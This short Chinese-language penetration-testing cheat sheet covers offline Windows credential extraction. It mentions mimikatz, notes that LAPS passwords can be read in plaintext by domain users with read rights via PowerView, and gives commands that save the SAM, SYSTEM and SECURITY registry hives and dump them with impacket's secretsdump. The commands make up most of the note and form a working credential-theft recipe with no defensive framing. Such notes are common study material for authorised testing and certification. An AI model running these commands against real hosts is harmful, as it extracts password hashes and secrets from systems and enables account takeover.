# windows

mimikatz



离线抓取

```
本地的分为sam和laps两种
laps是明文但是要域内有读权限的用户才行

powerview里有

sam

shadow copy

reg save HKLM\SYSTEM sys.hiv  
reg save HKLM\SAM C:\users\offsec.corp1\Downloads\sam  
reg save hklm\security security.hiv  

python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
```
